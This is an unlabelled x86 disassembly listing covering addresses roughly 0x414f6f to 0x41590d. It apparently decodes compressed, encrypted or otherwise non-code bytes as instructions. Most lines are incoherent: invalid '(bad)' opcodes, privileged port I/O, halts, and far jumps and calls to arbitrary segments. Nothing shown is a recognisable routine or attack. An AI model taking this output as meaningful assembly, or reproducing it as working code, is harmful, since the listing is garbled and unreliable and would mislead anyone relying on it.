  414f6f:	lods   eax,DWORD PTR ds:[esi]
  414f70:	arpl   WORD PTR [edx-0xbfd2a3],bx
  414f76:	loopne 0x414fbd
  414f78:	push   ecx
  414f79:	sub    dh,BYTE PTR [esi-0x792254c9]
  414f7f:	and    cl,0x17
  414f82:	out    dx,al
  414f83:	inc    edi
  414f84:	test   DWORD PTR [edi],esp
  414f86:	fidivr WORD PTR [ecx]
  414f88:	les    ebx,FWORD PTR [edx]
  414f8a:	dec    edi
  414f8b:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  414f8d:	jge    0x414f49
  414f8f:	call   0x1d429ec5
  414f94:	ret    
  414f95:	sahf   
  414f96:	mov    ebp,0x48eeaf7c
  414f9b:	push   ebx
  414f9c:	pusha  
  414f9d:	loopne 0x414f30
  414f9f:	lock in eax,dx
  414fa1:	dec    ebx
  414fa2:	xor    DWORD PTR [ecx-0x47],edi
  414fa5:	pushf  
  414fa6:	push   ebx
  414fa7:	aad    0xd0
  414fa9:	jno    0x414f68
  414fab:	adc    al,0xbe
  414fad:	dec    edi
  414fae:	sbb    ebx,DWORD PTR [edx+0x6]
  414fb1:	mov    ebx,0x2c1e978
  414fb6:	inc    edx
  414fb7:	push   ebp
  414fb8:	retf   0x88a2
  414fbb:	mov    cl,0x21
  414fbd:	fsubr  DWORD PTR [ebp+0x2f]
  414fc0:	jg     0x414f99
  414fc2:	push   0x5
  414fc4:	add    dl,bl
  414fc6:	scas   eax,DWORD PTR es:[edi]
  414fc7:	outs   dx,DWORD PTR ds:[esi]
  414fc8:	push   edx
  414fc9:	xor    bh,BYTE PTR [ecx-0x68]
  414fcc:	and    al,0xfb
  414fce:	loope  0x414f55
  414fd0:	xchg   esp,eax
  414fd1:	test   eax,0xac111d2a
  414fd6:	cmp    DWORD PTR [esi+0x75d17953],esi
  414fdc:	hlt    
  414fdd:	test   edx,ecx
  414fdf:	xchg   ebp,eax
  414fe0:	(bad)  
  414fe1:	out    0xfd,al
  414fe3:	jbe    0x414f7e
  414fe5:	test   BYTE PTR [esi+0x29],cl
  414fe8:	jmp    0x9fed:0x2756cefc
  414fef:	sbb    bl,0x41
  414ff2:	pop    eax
  414ff3:	je     0x414f9c
  414ff5:	sti    
  414ff6:	dec    esi
  414ff7:	sub    DWORD PTR [eax+ebp*2+0x5b1fd3c4],ecx
  414ffe:	scas   al,BYTE PTR es:[edi]
  414fff:	cwde   
  415000:	je     0x41504a
  415002:	and    DWORD PTR [edx-0x33],eax
  415005:	xor    al,BYTE PTR [ecx+0x44]
  415008:	xlat   BYTE PTR ds:[ebx]
  415009:	inc    edx
  41500a:	push   ds
  41500b:	inc    ebp
  41500c:	add    al,0x96
  41500e:	mov    ch,0x43
  415010:	add    eax,0x57998429
  415015:	retf   0x3b24
  415018:	cdq    
  415019:	call   0x5175:0xf9c15af4
  415020:	push   0x47a52638
  415025:	(bad)
  415028:	pusha  
  415029:	out    0x0,al
  41502b:	or     eax,0x9aef27a5
  415030:	push   esi
  415031:	popa   
  415032:	mov    al,ds:0x6d1471f4
  415037:	outs   dx,BYTE PTR ds:[esi]
  415038:	xor    eax,0xf09ad81b
  41503d:	imul   edx,DWORD PTR [edi],0xffffffed
  415040:	outs   dx,BYTE PTR ds:[esi]
  415041:	and    eax,0xfbc54c72
  415046:	mov    esp,0xe92e37a
  41504b:	push   edx
  41504c:	sub    BYTE PTR [eax],al
  41504e:	push   edi
  41504f:	fnstcw WORD PTR [ebx-0x2a]
  415052:	ja     0x415028
  415054:	or     DWORD PTR [eax+edx*4+0x1057d1e7],edx
  41505b:	xchg   ecx,eax
  41505c:	jnp    0x41502c
  41505e:	int3   
  41505f:	stc    
  415060:	xchg   esp,eax
  415061:	and    bh,cl
  415063:	(bad)  
  415064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415065:	jbe    0x415024
  415067:	jecxz  0x41500f
  415069:	ss push ds
  41506b:	jp     0x415015
  41506d:	fst    QWORD PTR [ebx+0x674f6909]
  415073:	xchg   ecx,eax
  415074:	mul    BYTE PTR [ebx-0x26]
  415077:	jae    0x415099
  415079:	cdq    
  41507a:	fs dec edx
  41507c:	adc    DWORD PTR [ebp+0x6d948e8a],0x24
  415083:	add    edx,ebp
  415085:	mov    ds:0xda3de830,al
  41508a:	jmp    0x34e36ec0
  41508f:	retf   
  415090:	retf   0x22e3
  415093:	pop    ds
  415094:	loopne 0x415037
  415096:	nop
  415097:	imul   esi,DWORD PTR [ebp-0x256e321f],0x66
  41509e:	inc    esi
  41509f:	js     0x415048
  4150a1:	push   ss
  4150a2:	mul    DWORD PTR [ecx+0x5e24932]
  4150a8:	les    esi,FWORD PTR [ecx]
  4150aa:	in     al,dx
  4150ab:	arpl   WORD PTR [edx+0x36bc5b2f],sp
  4150b1:	xor    ebx,DWORD PTR [esi+eiz*8]
  4150b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150b5:	clc    
  4150b6:	mov    ds:0x6ab9844a,al
	...
  415293:	pop    ebp
  415294:	add    DWORD PTR [edx+0x7debdeea],0x4880e6b7
  41529e:	shr    bh,cl
  4152a0:	sti    
  4152a1:	cmp    al,BYTE PTR ds:0x15b2f
  4152a7:	and    eax,0xaf000007
  4152ac:	xor    al,0x9
  4152ae:	jnp    0x415293
  4152b0:	pop    ss
  4152b1:	xor    ecx,DWORD PTR [eiz*2+0x7d64928e]
  4152b8:	add    edi,DWORD PTR [ebp-0x8b7e912]
  4152be:	jb     0x4152ec
  4152c0:	(bad)  
  4152c1:	(bad)  
  4152c2:	es inc edi
  4152c4:	shl    DWORD PTR ds:0x99493e01,cl
  4152ca:	and    ch,ch
  4152cc:	bound  esp,QWORD PTR [edi+ebp*8+0xe18541a]
  4152d3:	dec    esp
  4152d4:	adc    eax,DWORD PTR [ecx+0xc]
  4152d7:	push   ss
  4152d8:	stc    
  4152d9:	jg     0x4152e5
  4152db:	mov    cx,0xb7ad
  4152df:	sahf   
  4152e0:	sbb    eax,0x30eb6805
  4152e5:	lods   al,BYTE PTR ds:[esi]
  4152e6:	mov    dl,0x8b
  4152e8:	xchg   edi,eax
  4152e9:	lods   eax,DWORD PTR ds:[esi]
  4152ea:	lock int3 
  4152ec:	ja     0x415285
  4152ee:	fadd   QWORD PTR ds:[edi-0x2de51b10]
  4152f5:	xchg   esi,eax
  4152f6:	cmp    dh,BYTE PTR [ebx-0x42]
  4152f9:	mov    eax,ds:0xa2889e20
  4152fe:	xchg   edx,eax
  4152ff:	dec    eax
  415300:	jmp    0xe5d3:0xf51f432a
  415307:	mov    ch,0x12
  415309:	pop    ebx
  41530a:	fld    DWORD PTR [edx-0x7b]
  41530d:	pop    edx
  41530e:	pop    esp
  41530f:	inc    edi
  415310:	mov    WORD PTR [ecx-0x47093657],es
  415316:	call   0x94e9:0x2920a4a6
  41531d:	ja     0x4152d2
  41531f:	int    0x5a
  415321:	ds dec ebp
  415323:	cmc    
  415324:	mov    eax,ds:0xf67047c0
  415329:	fdiv   st,st(3)
  41532b:	xor    DWORD PTR [ebx-0x5a579388],eax
  415331:	enter  0x1c95,0xef
  415335:	xchg   esi,eax
  415336:	xchg   BYTE PTR [ecx],bh
  415338:	mov    BYTE PTR [edi-0x5cf2eb64],0x1d
  41533f:	push   ecx
  415340:	add    BYTE PTR [ebp-0x4868f14c],al
  415346:	or     DWORD PTR cs:[edi+0x60],ebp
  41534a:	test   eax,0xd41ed750
  41534f:	ins    DWORD PTR es:[edi],dx
  415350:	mov    esi,0x42d54946
  415355:	xor    al,0x93
  415357:	xor    eax,0xb789fe8a
  41535c:	xchg   DWORD PTR [edi+0x47c80ad2],eax
  415362:	enter  0x6cc6,0xae
  415366:	cli    
  415367:	sbb    ebx,DWORD PTR [eax]
  415369:	mov    bh,0x61
  41536b:	push   edi
  41536c:	and    eax,0xc4c80005
  415371:	shr    BYTE PTR [edx],cl
  415373:	mov    dl,0x2
  415375:	xor    ch,0x8b
  415378:	inc    ebp
  415379:	arpl   WORD PTR [edx],di
  41537b:	mov    ch,0xd0
  41537d:	inc    ebp
  41537e:	add    edi,0x38541893
  415384:	xchg   ebp,eax
  415385:	xchg   esp,eax
  415386:	dec    esp
  415387:	imul   ebp,eax,0xffffffc4
  41538a:	fild   WORD PTR [edi+0x70]
  41538d:	mov    ch,0xe3
  41538f:	lds    edx,FWORD PTR ds:0xee964d3f
  415395:	inc    dh
  415397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415398:	repz push 0xffffffa8
  41539b:	dec    esp
  41539c:	aam    0x8d
  41539e:	aad    0x21
  4153a0:	jbe    0x415397
  4153a2:	xor    ch,BYTE PTR ds:0x353318cc
  4153a8:	mov    dh,0xc5
  4153aa:	sub    DWORD PTR [ebx-0x2c],0x13
  4153ae:	cld    
  4153af:	icebp  
  4153b0:	xchg   ebx,eax
  4153b1:	xor    eax,0x9d66153
  4153b6:	and    BYTE PTR [edx],dl
  4153b8:	add    ch,BYTE PTR [ebx]
  4153ba:	lods   eax,DWORD PTR ds:[esi]
  4153bb:	add    bh,BYTE PTR [ebx+0x2c]
  4153be:	sub    BYTE PTR [eax+ecx*8-0x56],ah
  4153c2:	ds ret 0x10dc
  4153c6:	push   esi
  4153c7:	jne    0x41538c
  4153c9:	and    eax,0x62ba3189
  4153ce:	out    dx,eax
  4153cf:	dec    ecx
  4153d0:	inc    ebx
  4153d1:	dec    ecx
  4153d2:	lods   eax,DWORD PTR ds:[esi]
  4153d3:	int    0xd8
  4153d5:	sub    eax,0x696efe84
  4153da:	and    eax,0x26957720
  4153df:	cmc    
  4153e0:	idiv   BYTE PTR [esi]
  4153e2:	add    eax,0x5fe92dbe
  4153e7:	int3   
  4153e8:	sub    al,0x2
  4153ea:	loope  0x4153a8
  4153ec:	add    DWORD PTR [eax+0x50],eax
  4153ef:	(bad)  
  4153f0:	rcl    DWORD PTR ds:0x1d7cd9b9,cl
  4153f6:	mov    dh,0xed
  4153f8:	or     BYTE PTR [esi+0xcfdb9a],bl
  4153fe:	jno    0x41539f
  415400:	lock repnz xor ecx,0x32ff2084
  415408:	pop    esi
  415409:	in     eax,dx
  41540a:	sub    DWORD PTR [ecx-0x51cda1e9],esi
  415410:	cmc    
  415411:	mov    al,0xb0
  415413:	sub    bh,0xd3
  415416:	xor    ecx,DWORD PTR [esi]
  415418:	cmp    DWORD PTR [ebp+eax*4-0x72],ebx
  41541c:	jne    0x41549c
  41541e:	sub    bh,BYTE PTR [edx-0x7f]
  415421:	push   ss
  415422:	pop    edx
  415423:	and    eax,0x231e3e65
  415428:	retf   0xef57
  41542b:	(bad)  
  41542c:	popa   
  41542d:	mov    al,ds:0xd2c7ec5f
  415432:	jnp    0x4153bf
  415434:	sbb    al,0x13
  415436:	in     eax,dx
  415437:	add    dl,BYTE PTR ss:[ebp+ebp*8+0x2c]
  41543c:	test   eax,0x5a6d9ed
  415441:	(bad)  
  415442:	out    0x38,eax
  415444:	pop    edx
  415445:	scas   al,BYTE PTR es:[edi]
  415446:	(bad)  
  415447:	(bad)  
  415448:	addr16 push 0x76
  41544b:	jmp    0x5895:0x8eb76fc7
  415452:	and    DWORD PTR [ebp+0x5],edx
  415455:	stos   DWORD PTR es:[edi],eax
  415456:	mov    ?,WORD PTR [edi+0x4e]
  415459:	into   
  41545a:	push   0xc4e2b58
  41545f:	xor    BYTE PTR [edi],dl
  415461:	gs mov ecx,0xf2c3e933
  415467:	or     dh,BYTE PTR [eax+ebp*4]
  41546a:	xchg   ecx,eax
  41546b:	push   si
  41546d:	sbb    esi,esp
  41546f:	lea    esi,[esi-0x4]
  415472:	hlt    
  415473:	sbb    ebp,DWORD PTR [edi+0x577d58a9]
  415479:	aas    
  41547a:	inc    eax
  41547b:	mov    esp,0xbc7ec152
  415480:	xchg   BYTE PTR [edi+edx*4],bh
  415483:	mov    BYTE PTR ds:0x1e2135b3,ch
  415489:	loop   0x415450
  41548b:	std    
  41548c:	xor    DWORD PTR [esi+0x4e396213],edi
  415492:	adc    BYTE PTR [esi+edi*2+0x7c],al
  415496:	cwde   
  415497:	dec    esi
  415498:	call   0x54ffa56a
  41549d:	(bad)  
  41549f:	push   ecx
  4154a0:	ins    DWORD PTR es:[edi],dx
  4154a1:	mov    ebp,0xced749f7
  4154a6:	into   
  4154a7:	dec    edi
  4154a8:	retf   
  4154a9:	out    0xcb,al
  4154ab:	les    ebx,FWORD PTR [eax]
  4154ad:	adc    ch,al
  4154af:	repz fsubp st(1),st
  4154b2:	push   es
  4154b3:	cwde   
  4154b4:	out    dx,al
  4154b5:	fwait
  4154b6:	dec    ecx
  4154b7:	lea    eax,[eax]
  4154b9:	or     BYTE PTR [ecx-0x4],dl
  4154bc:	xor    ebx,DWORD PTR [edi]
  4154be:	inc    edx
  4154bf:	bound  ebp,QWORD PTR ds:0x7cf21276
  4154c5:	sbb    ecx,ecx
  4154c7:	mov    ds:0x6d8d57db,al
  4154cc:	mov    eax,0x303d5153
  4154d1:	xchg   edx,eax
  4154d2:	xchg   esp,eax
  4154d3:	aaa    
  4154d4:	sar    esi,1
  4154d6:	lods   al,BYTE PTR ds:[esi]
  4154d7:	ror    BYTE PTR [edi+ebx*8],1
  4154da:	ja     0x415472
  4154dc:	sbb    edx,DWORD PTR [esi-0x13572186]
  4154e2:	cld    
  4154e3:	in     al,dx
  4154e4:	(bad)  
  4154e5:	arpl   WORD PTR [esi-0x55f446c],dx
  4154eb:	lods   al,BYTE PTR ds:[esi]
  4154ec:	sahf   
  4154ed:	jl     0x41552d
  4154ef:	ror    BYTE PTR [ebx-0x5b],cl
  4154f2:	loope  0x4154eb
  4154f4:	or     eax,DWORD PTR [ebp+edx*1+0x5d62e0da]
  4154fb:	loop   0x415561
  4154fd:	inc    ecx
  4154fe:	test   eax,0x69c834c2
  415503:	push   0xb44c8e84
  415508:	pop    ebp
  415509:	pusha  
  41550a:	repnz mov ebp,0xa92bbe8
  415510:	mov    ebp,0x149c50a3
  415515:	dec    eax
  415516:	xchg   edi,eax
  415517:	pushf  
  415518:	jns    0x415528
  41551a:	jmp    0x4154f9
  41551c:	xchg   ebx,eax
  41551d:	clc    
  41551e:	mov    esp,0x3843f38d
  415523:	push   edi
  415524:	fbstp  TBYTE PTR [ebp+0x72c11103]
  41552a:	mov    dh,0x8
  41552c:	mov    ah,0x2a
  41552e:	lea    ebx,[esi+ebp*2]
  415531:	jg     0x4154cb
  415533:	sub    dl,BYTE PTR [edx+eax*8]
  415536:	gs pop es
  415538:	jl     0x4154c1
  41553a:	xchg   esi,eax
  41553b:	lods   al,BYTE PTR ds:[esi]
  41553c:	jae    0x4155ab
  41553e:	push   cs
  41553f:	cwde   
  415540:	mov    edx,0x8eb72989
  415545:	sahf   
  415546:	add    esi,esi
  415548:	cs repnz dec edx
  41554b:	shl    BYTE PTR [esi-0x4e7ba38b],0x7b
  415552:	aas    
  415553:	call   0x189e:0x37fc4e90
  41555a:	icebp  
  41555b:	das    
  41555c:	jns    0x4154e5
  41555e:	pop    es
  41555f:	pop    DWORD PTR [ebx+0x4b]
  415562:	je     0x415596
  415564:	mov    ds:0x2b7bded3,al
  415569:	loope  0x4154f4
  41556b:	daa    
  41556c:	lds    edx,FWORD PTR [ecx]
  41556e:	push   eax
  41556f:	mov    al,0x36
  415571:	inc    ebp
  415572:	sub    bh,BYTE PTR ds:0x7dad6591
  415578:	adc    al,0x74
  41557a:	push   ecx
  41557b:	lahf   
  41557c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41557d:	std    
  41557e:	push   esi
  41557f:	ins    BYTE PTR es:[edi],dx
  415580:	leave  
  415581:	or     DWORD PTR [edi-0x5d76e89a],esp
  415587:	xor    dl,al
  415589:	mov    ebp,0xa86b21a1
  41558e:	scas   eax,DWORD PTR es:[edi]
  41558f:	jmp    0x41552f
  415591:	xchg   ebp,eax
  415592:	mov    ecx,0x2e6ec27c
  415597:	in     eax,0xe
  415599:	dec    edx
  41559a:	retf   
  41559b:	pop    eax
  41559c:	jg     0x415613
  41559e:	jno    0x41553d
  4155a0:	(bad)  
  4155a1:	ficom  DWORD PTR [edi+edx*4]
  4155a4:	and    bh,ch
  4155a6:	pop    ds
  4155a7:	ins    DWORD PTR es:[edi],dx
  4155a8:	push   cs
  4155a9:	cld    
  4155aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155ab:	adc    ecx,DWORD PTR [edi-0x48fd83c1]
  4155b1:	fwait
  4155b2:	mov    al,0x52
  4155b4:	dec    esi
  4155b5:	repnz in al,0xee
  4155b8:	jbe    0x4155a3
  4155ba:	out    0xbf,eax
  4155bc:	pop    es
  4155bd:	pushf  
  4155be:	xchg   edx,eax
  4155bf:	(bad)  
  4155c0:	cmp    bh,BYTE PTR [esi-0x30]
  4155c3:	fadd   DWORD PTR [esi]
  4155c5:	ins    DWORD PTR es:[edi],dx
  4155c6:	xchg   BYTE PTR [esi+eax*1],bl
  4155c9:	in     eax,0xaf
  4155cb:	mov    WORD PTR ds:0xc24d90cd,cs
  4155d1:	arpl   WORD PTR [edi-0x40],si
  4155d4:	xor    DWORD PTR [edx+0x63],esi
  4155d7:	lods   al,BYTE PTR ds:[esi]
  4155d8:	(bad)  
  4155d9:	mov    esi,ds
  4155db:	ror    BYTE PTR [edx+0x5e],1
  4155de:	popa   
  4155df:	cmp    edx,edi
  4155e1:	jmp    0x9304:0xb4f42415
  4155e8:	mov    cl,0x16
  4155ea:	aaa    
  4155eb:	push   cs
  4155ec:	push   esi
  4155ed:	pop    ecx
  4155ee:	xchg   ecx,eax
  4155ef:	popf   
  4155f0:	int    0x84
  4155f2:	rol    DWORD PTR [edx],cl
  4155f4:	aaa    
  4155f5:	jp     0x4155b6
  4155f7:	addr16 push ebp
  4155f9:	dec    ecx
  4155fa:	and    eax,0x76cad517
  4155ff:	mov    esi,DWORD PTR [ecx-0x11]
  415602:	fdiv   DWORD PTR [esi-0x35a1e492]
  415608:	in     al,0x1b
  41560a:	mov    edx,DWORD PTR [edx]
  41560c:	inc    ebx
  41560d:	jae    0x4155ed
  41560f:	add    al,0x5b
  415611:	push   edi
  415612:	jmp    0x4155ac
  415614:	jecxz  0x4155fa
  415616:	das    
  415617:	daa    
  415618:	mov    ecx,0x486502e1
  41561d:	jecxz  0x4155dc
  41561f:	stc    
  415620:	sub    DWORD PTR [edi+ecx*2-0xe],ebp
  415624:	fimul  WORD PTR [eax+0x23acebd6]
  41562a:	lods   eax,DWORD PTR ds:[esi]
  41562b:	cmp    bh,cl
  41562d:	stos   BYTE PTR es:[edi],al
  41562e:	cmp    eax,0xc3acd99
  415633:	pop    eax
  415634:	mov    esp,0x748a5b45
  415639:	popf   
  41563a:	push   es
  41563b:	pop    esi
  41563c:	dec    esp
  41563d:	cmp    al,0xc1
  41563f:	ins    BYTE PTR es:[edi],dx
  415640:	lock daa 
  415642:	es sbb bh,dh
  415645:	dec    ebp
  415646:	test   al,0xb7
  415648:	mov    eax,ds:0x581a42f5
  41564d:	int    0x95
  41564f:	das    
  415650:	push   edi
  415651:	in     eax,0xe8
  415653:	into   
  415654:	fwait
  415655:	jmp    0x57473528
  41565a:	bound  eax,QWORD PTR [ebp+0x47]
  41565d:	add    DWORD PTR [esi],edi
  41565f:	rol    DWORD PTR [edx-0x40],0x79
  415663:	int    0xac
  415665:	cmp    al,0x7e
  415667:	xchg   DWORD PTR [edx+0x4d],eax
  41566a:	pop    ebx
  41566b:	mov    bl,0x7a
  41566d:	cli    
  41566e:	fsub   st(5),st
  415670:	enter  0x683b,0x60
  415674:	sub    dl,dh
  415676:	sbb    eax,0x313fcc5c
  41567b:	inc    ecx
  41567c:	mov    ds,WORD PTR [eax]
  41567e:	xor    cl,BYTE PTR [eax+0x42ead9c8]
  415684:	fst    QWORD PTR [ecx-0xf]
  415687:	push   edx
  415688:	push   esp
  415689:	test   BYTE PTR cs:[edi],ch
  41568c:	(bad)  
  41568e:	cs pop ecx
  415690:	pop    eax
  415691:	fadd   st(3),st
  415693:	rcr    DWORD PTR [edx-0x4d],cl
  415696:	not    BYTE PTR [esi+0x6f293a71]
  41569c:	xchg   ecx,eax
  41569d:	or     eax,DWORD PTR [ecx+0x30]
  4156a0:	mov    al,ds:0x10fe252b
  4156a5:	(bad)  
  4156a6:	out    dx,eax
  4156a7:	je     0x415709
  4156a9:	out    0x42,al
  4156ab:	mov    al,ds:0xc0cf1ea8
  4156b0:	loop   0x4156d1
  4156b2:	push   edx
  4156b3:	lock dec ecx
  4156b5:	cli    
  4156b6:	les    ecx,FWORD PTR [ebx-0x444bb671]
  4156bc:	push   DWORD PTR [ebx-0x7c7ccb81]
  4156c2:	push   ebx
  4156c3:	xor    DWORD PTR [ebx+eax*2-0x75],ebx
  4156c7:	mov    eax,0xb567cd98
  4156cc:	dec    eax
  4156cd:	pop    ebx
  4156ce:	or     al,0xb8
  4156d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156d1:	imul   ecx,ecx,0xffffffdc
  4156d4:	xor    bh,0xdb
  4156d7:	dec    ebp
  4156d8:	cs inc ecx
  4156da:	and    ebx,DWORD PTR [esi]
  4156dc:	add    DWORD PTR [ebx-0x55],eax
  4156df:	push   ebp
  4156e0:	fcomp  DWORD PTR [eax-0x5409282f]
  4156e6:	push   ss
  4156e7:	pusha  
  4156e8:	xor    eax,0x80211eb0
  4156ed:	fnsave [ebp-0x37ac41f7]
  4156f3:	xlat   BYTE PTR ds:[ebx]
  4156f4:	cli    
  4156f5:	icebp  
  4156f6:	inc    ebp
  4156f7:	push   ebx
  4156f8:	and    eax,0x8631759f
  4156fd:	gs push edi
  4156ff:	mov    bl,0x94
  415701:	sahf   
  415702:	leave  
  415703:	lods   al,BYTE PTR ds:[esi]
  415704:	loopne 0x4156b8
  415706:	jecxz  0x41569a
  415708:	mov    bl,0x42
  41570a:	xchg   ebx,eax
  41570b:	pop    ss
  41570c:	mov    esp,ds
  41570e:	push   eax
  41570f:	pop    ecx
  415710:	fs inc ebx
  415712:	jo     0x4156ba
  415714:	dec    ebp
  415715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415716:	out    0x20,al
  415718:	aaa    
  415719:	jge    0x41570b
  41571b:	clc    
  41571c:	hlt    
  41571d:	dec    ebx
  41571e:	fmul   QWORD PTR ds:0x19867d
  415724:	pop    ecx
  415725:	jne    0x4156b9
  415727:	xchg   esp,eax
  415728:	neg    BYTE PTR [ebx]
  41572a:	jb     0x4156d5
  41572c:	push   ebp
  41572d:	jnp    0x41573e
  41572f:	nop
  415730:	fild   WORD PTR [esi+0x32]
  415733:	pop    ss
  415734:	lods   al,BYTE PTR ds:[esi]
  415735:	adc    al,0xce
  415737:	imul   BYTE PTR [edi]
  415739:	and    al,0x6a
  41573b:	pop    es
  41573c:	call   0x239c:0xb5ef1a04
  415743:	xor    DWORD PTR [esi+0x5c63bd3a],ebp
  415749:	aam    0xa9
  41574b:	cmp    DWORD PTR [eax-0x53b1ed34],esp
  415751:	mov    ah,0x72
  415753:	out    0x4b,eax
  415755:	cli    
  415756:	cmpps  xmm2,XMMWORD PTR [edx],0x22
  41575a:	pop    ss
  41575b:	aad    0xed
  41575d:	cmp    al,BYTE PTR [edx-0x47f6ee52]
  415763:	inc    ebp
  415764:	dec    ebx
  415765:	add    al,0xe3
  415767:	ds inc esi
  415769:	or     DWORD PTR [esi+eax*4],eax
  41576c:	add    DWORD PTR [edx-0xc],esi
  41576f:	pop    DWORD PTR [eax]
  415771:	xchg   bh,ch
  415773:	lea    ebx,[esi+edi*1]
  415776:	mov    edx,0x4fdcc4ed
  41577b:	pop    ss
  41577c:	inc    edi
  41577d:	push   cs
  41577e:	pop    edx
  41577f:	fcom   DWORD PTR [ebp+0x574a6d26]
  415785:	fild   WORD PTR [ebp+esi*8-0x233e141]
  41578c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41578d:	test   BYTE PTR [ebp-0x5c],0x53
  415791:	div    DWORD PTR [esi+0x719ca45c]
  415797:	and    esp,DWORD PTR [ebx]
  415799:	(bad)  
  41579a:	xor    al,0x3
  41579c:	dec    edx
  41579d:	sbb    edi,0xaf90dc81
  4157a3:	out    dx,eax
  4157a4:	loop   0x4157a4
  4157a6:	aaa    
  4157a7:	scas   al,BYTE PTR es:[edi]
  4157a8:	scas   al,BYTE PTR es:[edi]
  4157a9:	mov    ah,0xed
  4157ab:	inc    ebx
  4157ac:	stc    
  4157ad:	sbb    esp,esp
  4157af:	in     al,0xc3
  4157b1:	mov    ds:0xefd34342,eax
  4157b6:	inc    ecx
  4157b7:	push   0x67
  4157b9:	fdivp  st(1),st
  4157bb:	repnz scas al,BYTE PTR es:[edi]
  4157bd:	outs   dx,DWORD PTR ds:[esi]
  4157be:	aaa    
  4157bf:	jo     0x4157cf
  4157c1:	and    eax,0x4bb00223
  4157c6:	mov    ecx,0x6cbd244a
  4157cb:	cmp    eax,0x29475267
  4157d0:	repnz daa 
  4157d2:	xchg   DWORD PTR [edx-0x42],esp
  4157d5:	xchg   BYTE PTR [ecx-0x47],ch
  4157d8:	push   ebp
  4157d9:	popf   
  4157da:	jge    0x415762
  4157dc:	cwde   
  4157dd:	pusha  
  4157de:	inc    edx
  4157df:	mov    ds:0x3b129dd4,eax
  4157e4:	outs   dx,DWORD PTR ds:[esi]
  4157e5:	jmp    edx
  4157e7:	into   
  4157e8:	test   al,0xf8
  4157ea:	mov    dh,0xdc
  4157ec:	push   cs
  4157ed:	xor    BYTE PTR [eax-0x9],bl
  4157f0:	nop
  4157f1:	sbb    BYTE PTR ds:0x98a31071,0xe5
  4157f8:	outs   dx,DWORD PTR ds:[esi]
  4157f9:	mov    ds:0x109dea5f,eax
  4157fe:	add    al,0xd1
  415800:	mov    ebx,0x1ff31ae
  415805:	mov    ch,0x7f
  415807:	mov    BYTE PTR [edx+ebp*2],ah
  41580a:	gs retf 0xaf5b
  41580e:	mov    ebp,0xeabedc
  415814:	inc    ebx
  415815:	jo     0x41582d
  415817:	pop    edi
  415818:	test   DWORD PTR [ebx+0x538f60a4],edx
  41581e:	call   0xd6f6:0x6e3c4982
  415825:	sbb    BYTE PTR [ebp+edx*2-0x28],dh
  415829:	fild   WORD PTR [ecx]
  41582b:	pusha  
  41582c:	adc    al,0x76
  41582e:	and    bh,al
  415830:	rol    DWORD PTR [ecx],0x77
  415833:	test   DWORD PTR [ecx+0x2d],edx
  415836:	test   ah,bl
  415838:	add    al,0x54
  41583a:	sub    BYTE PTR ds:0xbaaea349,dh
  415840:	push   edx
  415841:	cld    
  415842:	push   esi
  415843:	push   edi
  415844:	mov    ds:0xe7d27ddd,eax
  415849:	mov    ds:0x6e78a794,eax
  41584e:	jl     0x4157fb
  415850:	or     ebp,DWORD PTR [eax]
  415852:	xchg   ebx,eax
  415853:	mov    eax,0x71f070f2
  415858:	jle    0x41583b
  41585a:	stc    
  41585b:	scas   eax,DWORD PTR es:[edi]
  41585c:	loope  0x41585c
  41585e:	push   esi
  41585f:	sbb    edi,edi
  415861:	icebp  
  415862:	inc    edx
  415863:	pop    eax
  415864:	loope  0x41589b
  415866:	push   0x18
  415868:	push   cs
  415869:	xor    BYTE PTR [ebp-0x7dbc0d7f],ch
  41586f:	(bad)  
  415871:	sets   BYTE PTR [edi]
  415874:	cmp    esi,edi
  415876:	cmp    eax,0x4d8fe255
  41587b:	ret    
  41587c:	sbb    DWORD PTR [eax-0x6d],eax
  41587f:	sub    dh,0xa3
  415882:	or     DWORD PTR [ecx+0x5eb56e49],ebx
  415888:	dec    ebx
  415889:	and    al,al
  41588b:	mov    ds:0xfc66525a,eax
  415890:	pop    ebx
  415891:	sub    edx,eax
  415893:	addr16 jae 0x4158ff
  415896:	jecxz  0x41587e
  415898:	stos   BYTE PTR es:[edi],al
  415899:	jmp    0xdaf4:0xa733ac60
  4158a0:	pusha  
  4158a1:	inc    eax
  4158a2:	in     eax,dx
  4158a3:	mov    bl,0x6e
  4158a5:	dec    ecx
  4158a6:	pop    es
  4158a7:	mov    WORD PTR [ebx+0x7970d064],ds
  4158ad:	jmp    FWORD PTR [edx+ebx*4-0x18]
  4158b1:	imul   ebp,DWORD PTR [ebx],0x53
  4158b4:	add    BYTE PTR [esi-0x5c1bb9d5],dl
  4158ba:	jge    0x4158dd
  4158bc:	cmp    bl,bh
  4158be:	jbe    0x4158cc
  4158c0:	pop    ecx
  4158c1:	or     BYTE PTR [esi+0x74],al
  4158c4:	mov    ah,0x83
  4158c6:	fidivr WORD PTR [edx]
  4158c8:	adc    eax,esp
  4158ca:	test   BYTE PTR [edx+ecx*2],dl
  4158cd:	inc    edx
  4158ce:	xchg   edx,ebx
  4158d0:	fs and esp,0xc723f7f3
  4158d7:	push   esp
  4158d8:	dec    edx
  4158d9:	dec    edx
  4158da:	cmp    ah,BYTE PTR [edx]
  4158dc:	dec    esi
  4158dd:	imul   edi,DWORD PTR [edx-0x79],0x65
  4158e1:	mov    bh,0x21
  4158e3:	mov    esi,0xf9286996
  4158e8:	jne    0x415949
  4158ea:	mov    cl,0x89
  4158ec:	imul   ebx,DWORD PTR [ebx],0x1aaa5a7e
  4158f2:	mov    ebp,es
  4158f4:	js     0x41592f
  4158f6:	ins    DWORD PTR es:[edi],dx
  4158f7:	scas   al,BYTE PTR es:[edi]
  4158f8:	and    esi,DWORD PTR [ecx]
  4158fa:	pop    ebx
  4158fb:	loope  0x4158ce
  4158fd:	not    edi
  4158ff:	rol    ebx,cl
  415901:	iret   
  415902:	xlat   BYTE PTR ds:[ebx]
  415903:	in     eax,0x51
  415905:	jmp    0x41597c
  415907:	xor    al,0xa1
  415909:	mov    dh,0xab
  41590b:	or     ebx,eax
  41590d:	in     eax,0x22
